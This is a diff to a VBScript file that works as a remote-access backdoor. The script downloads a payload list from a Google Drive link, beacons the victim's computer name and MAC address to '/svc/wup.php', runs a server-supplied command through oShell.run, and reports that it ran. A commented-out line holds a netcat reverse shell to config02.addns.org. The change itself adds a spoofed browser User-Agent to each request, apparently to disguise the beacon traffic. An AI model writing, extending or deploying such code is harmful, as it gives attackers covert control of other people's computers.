@@ -5,6 +5,7 @@ dim url,mac
   url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
 'msgbox  url&"site.txt"
 'xmlhttp.open "get", url&"site.txt", false
+xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
 xmlhttp.open "get", url, false
 xmlhttp.send
 strOutput = xmlhttp.responseText
@@ -37,6 +38,7 @@ dim arr
       'msgbox x
       'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
       'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
+      xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
       xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
       xmlhttp.send
       strOutput = xmlhttp.responseText
@@ -44,6 +46,7 @@ dim arr
       'Wscript.Echo strOutput
       if (right(arr(7),1)=1) then
         oShell.run right(arr(8),len(arr(8))-4)
+        xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
         xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
         xmlhttp.send
       end if
